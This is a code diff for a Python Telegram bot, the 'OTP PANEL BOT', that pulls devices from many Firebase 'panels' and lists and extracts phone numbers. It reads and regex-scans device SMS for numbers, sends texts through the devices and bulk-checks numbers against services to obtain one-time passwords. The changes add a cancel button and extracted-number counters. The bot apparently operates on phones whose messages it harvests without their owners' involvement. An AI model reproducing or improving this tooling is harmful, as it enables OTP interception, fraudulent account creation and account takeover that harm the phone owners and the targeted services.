@@ -2,9 +2,9 @@
 """
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — PRIVATE ADMIN EDITION           
-  Stable Chunk Engine + Ultra Fast Fetch + Live Tracker
-  + 100% Windows Crash Fixed + Smart Search System
-  + Railway Web Server (24/7 Alive)
+  Railway Cloud Optimized + Dummy Web Server + 24/7 Alive
+  Stable Chunk Engine + Ultra Fast Fetch + Live Counter
+  + REAL CANCEL BUTTON (Kills Background Task)
 ══════════════════════════════════════════════════════
 """
 
@@ -92,13 +92,7 @@ WORKER_SEMAPHORE = asyncio.Semaphore(1500)
 PREFETCH_POOL: dict[str, list] = {}
 PREFETCH_TASKS: dict[str, asyncio.Task] = {}
 
-# 🔥 LIVE PROGRESS TRACKER & ANTI-CRASH LIMITER
 HEAVY_TASK_LIMITER = asyncio.Semaphore(15) 
-scan_progress = {
-    "scanned": 0,
-    "total": 0,
-    "is_scanning": False
-}
 
 SYS_SETTINGS = {
     "api_keys": [
@@ -203,6 +197,7 @@ def load_data():
                 "vip_until": 2e10,
                 "otp_count": 0,
                 "bots_created": 0,
+                "bonus_10_received": True,
                 "custom_dbs": []
             }
             save_user(adm)
@@ -245,7 +240,6 @@ async def hourly_admin_backup(app: Application):
                 f"👑 **VIP/Admin Users:** {vip_users}\n"
                 f"🆓 **Free Users:** {free_users}\n"
                 f"🔗 **Total Custom Panels Added:** {total_custom_panels}\n\n"
-                "Auto-Backup Data Attached."
             )
             file_path = os.path.join(SYS_DIR, f"Backup_{int(time.time())}.json")
             with open(file_path, "w", encoding="utf-8") as f:
@@ -464,13 +458,20 @@ def device_label(d: Device) -> str:
     if d.numbers: return " & ".join(d.numbers)
     return f"{d.name} ({d.id[:8]})"
 
+# 🔥 SHOW TOTAL NUMBERS EXTRACTED IN HEADER
 def device_list_header(devices: list[Device], page: int = 0) -> str:
     online  = sum(1 for d in devices if d.status == "online")
     offline = len(devices) - online
+    total_nums = sum(len(d.numbers) for d in devices)
     total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
     return (
-        f"OTP PANEL PRO\n━━━━━━━━━━━━━━━━━━\nOnline: {online}   Offline: {offline}\n"
-        f"Total: {len(devices)} Devices\nPage {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\nSelect a number below:"
+        f"🔥 **OTP PANEL PRO** 🔥\n━━━━━━━━━━━━━━━━━━\n"
+        f"🟢 Online Devices: {online}\n"
+        f"🔴 Offline Devices: {offline}\n"
+        f"📱 Total Devices: {len(devices)}\n"
+        f"🔢 **Total Extracted Numbers: {total_nums}**\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"Page {page + 1} of {total_pages}\nSelect a number below:"
     )
 
 def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
@@ -491,6 +492,7 @@ def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboard
         return InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")
 
     for d in page_devs: rows.append([_btn(d)])
+
     nav = []
     if page > 0: nav.append(InlineKeyboardButton("Prev", callback_data=f"pg:{page - 1}"))
     nav.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="noop"))
@@ -693,8 +695,6 @@ async def fetch_db_data_task(tag: str, url: str, results_list: list):
         if devices_list:
             results_list.extend(devices_list)
     except: pass
-    finally:
-        scan_progress["scanned"] += 1
 
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
     if users_db is None: users_db = {}
@@ -769,7 +769,6 @@ async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 360
 #  TELEGRAM COMMAND HANDLERS
 # ═══════════════════════════════════════════════════════
 
-# 🛑 RESTORED: Admin command to refresh keyboard
 async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id  = update.effective_chat.id
     if chat_id in ADMIN_IDS:
@@ -832,7 +831,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text(welcome_text, reply_markup=get_reply_menu(chat_id), parse_mode="Markdown")
 
 # ═══════════════════════════════════════════════════════
-#  CALLBACK QUERY HANDLER
+#  CALLBACK QUERY HANDLER 
 # ═══════════════════════════════════════════════════════
 
 async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -842,6 +841,14 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         chat_id = query.message.chat_id
         bot_token = ctx.bot.token
         users_db = all_users
+
+        # 🔥 REAL CANCEL MISSION LOGIC 🔥
+        if data == "cancel_action":
+            pending_action.pop(chat_id, None)
+            try: await query.message.delete()
+            except: pass
+            await ctx.bot.send_message(chat_id, "❌ **Mission Cancelled Successfully!** Process ruk gaya hai.", parse_mode="Markdown")
+            return
 
         if data == "check_join":
             if await check_force_join(ctx.bot, chat_id):
@@ -874,7 +881,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if data.startswith("chk_srv:"):
             service = data.split(":")[1]
             pending_action[chat_id] = {"action": "check_number_input", "service": service}
-            await safe_edit(query, f"Send a 10 digit number OR multiple numbers (separated by space) to manually check on {service.capitalize()}:\n\n_Press Cancel to stop_", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]), parse_mode="Markdown")
+            await safe_edit(query, f"Send a 10 digit number OR multiple numbers (separated by space) to manually check on {service.capitalize()}:\n\n_Press Cancel to stop_", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Mission", callback_data="cancel_action")]]), parse_mode="Markdown")
             return
 
         if data.startswith("auto_fb:"):
@@ -884,6 +891,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
             async with HEAVY_TASK_LIMITER:
                 service = data.split(":")[1]
+                pending_action[chat_id] = {"action": "auto_checking"} # Save state to verify later
                 
                 pool = PREFETCH_POOL.setdefault(service, [])
                 seen_set = user_seen_unreg.setdefault(chat_id, set())
@@ -899,11 +907,9 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     final_dev = valid_item["device"]
                     final_res = valid_item["res"]
                     final_num = valid_item["num"]
-                    
                     seen_set.add(final_num)
                     await safe_edit(query, f"⚡ <b>INSTANT CACHE HIT (Ghost Worker)</b>\n━━━━━━━━━━━━━━━━━━\n📡 *Loading pre-fetched number...*", parse_mode="HTML")
                     await asyncio.sleep(0.3)
-                    
                     await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
                     
                     time_diff = int(time.time() - final_dev.last_sms_ts)
@@ -922,9 +928,15 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     ]
                     return await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
 
-                await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Fetching ONLINE devices active in last 30 MINUTES...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]), parse_mode="HTML")
+                await safe_edit(
+                    query, 
+                    f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Fetching ONLINE devices active in last 30 MINUTES...</i>", 
+                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Mission", callback_data="cancel_action")]]), 
+                    parse_mode="HTML"
+                )
                 
                 all_devices = await get_all_devices(bot_token, chat_id, users_db)
+                if chat_id not in pending_action: return # CHECK IF USER CANCELLED
                 if not all_devices:
                     return await safe_edit(query, "❌ No devices found. Please Add Custom Panels or Refer to get VIP Global access.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
 
@@ -936,6 +948,8 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                             d.last_sms_ts = last_ts
                             fresh_devices.append(d)
                 
+                if chat_id not in pending_action: return # CHECK IF USER CANCELLED
+
                 if not fresh_devices: 
                     return await safe_edit(query, "❌ Koi bhi number pichle 30 minute me online/active nahi mila. OTP aane ki chance low hai.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
                 
@@ -950,11 +964,19 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
                 check_pool = fresh_devices[:100] 
                 
-                await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 Scanning {len(check_pool)} Active Numbers...\n⚡ <i>Hitting APIs concurrently...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]), parse_mode="HTML")
+                # 🔥 EXACTLY DISPLAY THE AMOUNT OF ACTIVE NUMBERS
+                await safe_edit(
+                    query, 
+                    f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n✅ Found <b>{len(fresh_devices)}</b> Total Active Numbers!\n📡 Scanning Top {len(check_pool)} Numbers...\n⚡ <i>Hitting APIs concurrently...</i>", 
+                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Mission", callback_data="cancel_action")]]), 
+                    parse_mode="HTML"
+                )
                 
                 tasks = [check_number_api(service, d.numbers[0]) for d in check_pool]
                 results = await asyncio.gather(*tasks, return_exceptions=True)
                 
+                if chat_id not in pending_action: return # CHECK IF USER CANCELLED
+
                 for d, res in zip(check_pool, results):
                     if isinstance(res, dict) and not res.get("status") == "error":
                         is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
@@ -984,11 +1006,11 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
                 else:
                     await safe_edit(query, f"<b>✅ ALL REGISTERED</b>\n\nScanned {len(check_pool)} fresh active numbers. ALL are registered.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Scan Again", callback_data=data)], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
-                return
+            return
 
         if data.startswith("search_num:"):
             search_term = data.split(":")[1]
-            await safe_edit(query, f"⏳ Searching databases for {search_term}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
+            await safe_edit(query, f"⏳ Searching databases for `{search_term}`...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Mission", callback_data="cancel_action")]]), parse_mode="Markdown")
             all_devices = await get_all_devices(bot_token, chat_id, users_db)
             found_devs = [d for d in all_devices if any(search_term in num for num in d.numbers) and d.status == "online"]
             if not found_devs: return await safe_edit(query, f"📭 No online devices found for {search_term}.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
@@ -1181,7 +1203,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         pass
 
 # ═══════════════════════════════════════════════════════
-#  TEXT MESSAGE HANDLER (Catch All Shield)
+#  TEXT MESSAGE HANDLER
 # ═══════════════════════════════════════════════════════
 
 async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1206,7 +1228,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if text == "Search Number":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action[chat_id] = {"action": "search_live_number"}
-            await update.message.reply_text("🔍 **SEARCH LIVE NUMBER**\n\nJis number ka OTP check karna hai, use type karein (e.g., 911234567890):\n\n_Press Cancel to stop_", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]), parse_mode="Markdown")
+            await update.message.reply_text("🔍 **SEARCH LIVE NUMBER**\n\nJis number ka OTP check karna hai, use type karein (e.g., 911234567890):\n\n_Press Cancel to stop_", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Mission", callback_data="cancel_action")]]), parse_mode="Markdown")
             return
 
         if text == "Manual Checker":
@@ -1290,20 +1312,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 devices = await get_all_devices(bot_token, chat_id, users_db)
                 
                 if not devices:
-                    if scan_progress["is_scanning"] or len(GLOBAL_DEVICE_CACHE.get("ALL", [])) == 0:
-                        scanned = scan_progress.get("scanned", 0)
-                        total = scan_progress.get("total", 0)
-                        pct = int((scanned / total) * 100) if total > 0 else 0
-                        
-                        msg = (
-                            f"⏳ **System is booting up and scanning panels!**\n\n"
-                            f"Background me naye URLs load ho rahe hain...\n"
-                            f"📊 **Progress:** {scanned} / {total} Panels Checked ({pct}%)\n\n"
-                            f"Kripya thoda wait karein aur firse try karein."
-                        )
-                        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]), parse_mode="Markdown")
-                    else:
-                        await update.message.reply_text("❌ Aapke paas abhi koi active devices nahi hain. 'Add Custom Panel' se panel add karein ya VIP lein.")
+                    await update.message.reply_text("⏳ **System is scanning panels!**\n\nAbhi database se numbers fetch ho rahe hain. Kripya 30-40 seconds baad refresh karein.", parse_mode="Markdown")
                     return
                     
                 await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
@@ -1316,9 +1325,12 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
             async with HEAVY_TASK_LIMITER:
                 user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-                wait_msg = await update.message.reply_text("Scanning devices without numbers for hidden numbers...\n\nChecking active devices, please wait...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
+                pending_action[chat_id] = {"action": "scanning_hidden"}
+                wait_msg = await update.message.reply_text("Scanning devices without numbers for hidden numbers...\n\nChecking active devices, please wait...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Mission", callback_data="cancel_action")]]))
                 
                 devices = await get_all_devices(bot_token, chat_id, users_db)
+                if chat_id not in pending_action: return # CHECK CANCEL
+
                 target_devices = [d for d in devices if not d.numbers]
                 
                 if not target_devices:
@@ -1330,6 +1342,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 phone_pattern = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
                 found_count = 0
                 for d in target_devices[:50]: 
+                    if chat_id not in pending_action: return # CHECK CANCEL
                     smss = await get_device_sms(d, limit=20, max_age_sec=86400) 
                     found_nums = set()
                     sample_sms = ""
@@ -1376,7 +1389,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 await update.message.reply_text("❌ Invalid input! Kripya sahi 10-digit number dalein.")
                 return
                 
-            wait_msg = await update.message.reply_text(f"⏳ Searching databases for `+{clean_search}`...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]), parse_mode="Markdown")
+            wait_msg = await update.message.reply_text(f"⏳ Searching databases for `+{clean_search}`...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Mission", callback_data="cancel_action")]]), parse_mode="Markdown")
             all_devices = await get_all_devices(bot_token, chat_id, users_db)
             found_devs = [d for d in all_devices if any(clean_search in num for num in d.numbers) and d.status == "online"]
             
@@ -1403,10 +1416,11 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 
                 service = state["service"]
                 pending_action.pop(chat_id)
+                pending_action[chat_id] = {"action": "bulk_checking"}
                 
                 if len(target_nums) == 1:
                     number = target_nums[0]
-                    wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
+                    wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Mission", callback_data="cancel_action")]]))
                     res = await check_number_api(service, number)
                     
                     is_error = res.get("status") == "error"
@@ -1422,13 +1436,14 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
                 else:
                     total_bulk = len(target_nums)
-                    wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Checking {total_bulk} numbers on {service.capitalize()}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
+                    wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Checking {total_bulk} numbers on {service.capitalize()}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Mission", callback_data="cancel_action")]]))
                     
                     bulk_results = []
                     registered_list = []
                     BATCH_SIZE = 100 
                     
                     for i in range(0, total_bulk, BATCH_SIZE):
+                        if chat_id not in pending_action: return # CHECK CANCEL
                         batch = target_nums[i:i+BATCH_SIZE]
                         tasks = [check_number_api(service, num) for num in batch]
                         res_list = await asyncio.gather(*tasks, return_exceptions=True)
@@ -1445,6 +1460,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                             
                         await asyncio.sleep(0.5)
                     
+                    if chat_id not in pending_action: return # CHECK CANCEL
                     res_text = f"<b>📊 BULK CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
                     if len(res_text) > 4000:
                         res_text = res_text[:4000] + "\n...[Truncated]"
@@ -1494,8 +1510,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             save_user(chat_id)
             await update.message.reply_text(f"✅ {len(firebase_urls)} Personal Firebase URLs successfully add ho gaye!\n\nAb aap 'Devices List' me jakar sirf apne numbers dekh sakte hain.", reply_markup=get_reply_menu(chat_id))
             return
-    except Exception as e:
-        pass
+    except: pass
 
 # ═══════════════════════════════════════════════════════
 #  FIREBASE POLL — CHUNK ENGINE
@@ -1544,11 +1559,8 @@ async def fetch_device_data_task(tag: str, url: str, results_list: list):
         if devices_list:
             results_list.extend(devices_list)
     except: pass
-    finally:
-        scan_progress["scanned"] += 1
 
 async def _update_global_cache():
-    global scan_progress
     dbs_to_poll = dict(DATABASES)
     for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
         dbs_to_poll[f"G_{i}"] = g_url
@@ -1561,10 +1573,6 @@ async def _update_global_cache():
 
     all_devices_gathered = []
     items = list(dbs_to_poll.items())
-    
-    scan_progress["total"] = len(items)
-    scan_progress["scanned"] = 0
-    scan_progress["is_scanning"] = True
     
     for i in range(0, len(items), CHUNK_SIZE):
         chunk = items[i:i + CHUNK_SIZE]
@@ -1588,7 +1596,6 @@ async def _update_global_cache():
 
     unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
     GLOBAL_DEVICE_CACHE["ALL"] = unique_devices
-    scan_progress["is_scanning"] = False
 
 async def global_cache_loop():
     while True:
@@ -1659,7 +1666,8 @@ async def poll_single_db(tag: str, url: str) -> None:
                         try:
                             t_val = float(sms_ts)
                             if t_val > 1e11: t_val /= 1000
-                            if (time.time() - t_val) <= 120: is_recent = True
+                            if (time.time() - t_val) <= 120:  
+                                is_recent = True
                         except: pass
                         
                     if not is_recent: continue
@@ -1747,7 +1755,8 @@ def main() -> None:
     if not TOKEN: raise SystemExit("TOKEN is missing!")
 
     if sys.platform == 'win32':
-        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
+        try: asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
+        except: pass
 
     app = (
         Application.builder()
@@ -1768,7 +1777,7 @@ def main() -> None:
 
     async def post_init(application: Application) -> None:
         load_data()
-        asyncio.create_task(start_web_server())   # 🔥 Binds port for Railway
+        asyncio.create_task(start_web_server())   
         asyncio.create_task(global_cache_loop())  
         asyncio.create_task(poll_loop(application)) 
         asyncio.create_task(auto_save_loop())
